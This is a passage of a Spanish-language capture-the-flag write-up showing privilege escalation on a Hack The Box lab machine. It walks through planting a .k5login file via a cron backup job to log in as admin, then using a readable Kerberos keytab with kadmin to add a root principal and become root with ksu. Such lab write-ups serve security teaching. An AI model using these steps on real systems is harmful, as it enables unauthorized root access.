## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
id
cat /etc/crontab
```

Aqui vemos que hay una tarea que se ejecuta por el usuario admin cada minuto. El script es `/usr/local/bin/log_backup.sh`
Este archivo basicamente copia lo que hay en el directorio `/var/log/squid` en el directorio `/home/admin`.

```bash
cd /home/admin
cd /var/log/
ls -la | grep squid
```

Vemos que podemos escribir en el /var/log/squid pero no podemos entrar en el /home/admin.

Buscando por internet, vemos que existe un fichero que se puede poner en el directorio del usuario y que permite dar
conneccion con kerberos. Este fichero seria .k5login.


```bash
cd /var/log/squid/
echo 'j.nakazawa@REALCORP.HTB' > .k5login
```

Esperamos un poco y lanzamos desde nuestra maquina de atacante una conneccion ssh

```bash
ssh admin@10.10.10.224
```

Ahora que estamos conectados como admin miramos como nos podemos pasar a root


```bash
cd /
find / -type f -user admin 2>/dev/null
find / -type f -user admin 2>/dev/null | grep -v "proc"
find / -type f -user admin 2>/dev/null | grep -v -E "proc|cgroup"
find / -type f -group admin 2>/dev/null | grep -v -E "proc|cgroup"
```

Encontramos un fichero `/etc/krb5.keytab`

```bash
cat /etc/krb5.keytab
file /etc/krb5.keytab
```

Si buscamos lo que es por internet vemos que hay una via potencial de rootear esta maquina usando este fichero. La idea aqui seria
de crear un nuevo principal al usuario root cambiandole la contraseña.

```bash
klist -k /etc/krb5.keytab
kadmin -h
kadmin -kt /etc/krb5.keytab
kadmin -kt /etc/krb5.keytab -p kadmin/admin@REALCORP.HTB
?
addprinc root@REALCORP.HTB
password: test123
reenter password: test123
exit
```

Si ahora lanzamos 

```bash
ksu
Kerberos password for root@REALCORP.HTB: test123
whoami

#Output
root
```

Ya somos root y podemos leer la flag
